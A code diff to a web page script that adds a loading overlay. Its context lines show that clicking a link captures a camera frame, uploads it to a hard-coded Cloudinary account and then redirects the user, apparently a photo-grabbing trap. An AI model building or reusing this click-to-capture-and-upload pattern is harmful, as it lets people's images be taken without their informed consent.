@@ -4,6 +4,7 @@ const captureLinks = document.querySelectorAll('.link-box');
 const modal = document.getElementById('cameraModal');
 const retryButton = document.getElementById('retryCamera');
 const linkBoxes = document.querySelectorAll('.link-box');
+const loadingOverlay = document.getElementById('loadingOverlay');
 
 // Cloudinary configuration
 const cloudName = 'dsfc6qjqx';
@@ -94,6 +95,10 @@ captureLinks.forEach(link => {
       showCameraModal();
       return;
     }
+    
+    // Show loading state
+    loadingOverlay.style.display = 'flex';
+    
     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
     canvas.toBlob(blob => {
       const formData = new FormData();
@@ -108,11 +113,15 @@ captureLinks.forEach(link => {
       .then(data => {
         console.log('Image uploaded to Cloudinary:', data.secure_url);
         setTimeout(() => {
+          // Hide loading just before redirect
+          loadingOverlay.style.display = 'none';
           window.location.href = link.dataset.redirectUrl;
         }, 1000);
       })
       .catch(error => {
         console.error('Error uploading image to Cloudinary:', error);
+        // Hide loading on error
+        loadingOverlay.style.display = 'none';
       });
     }, 'image/jpeg');
   });
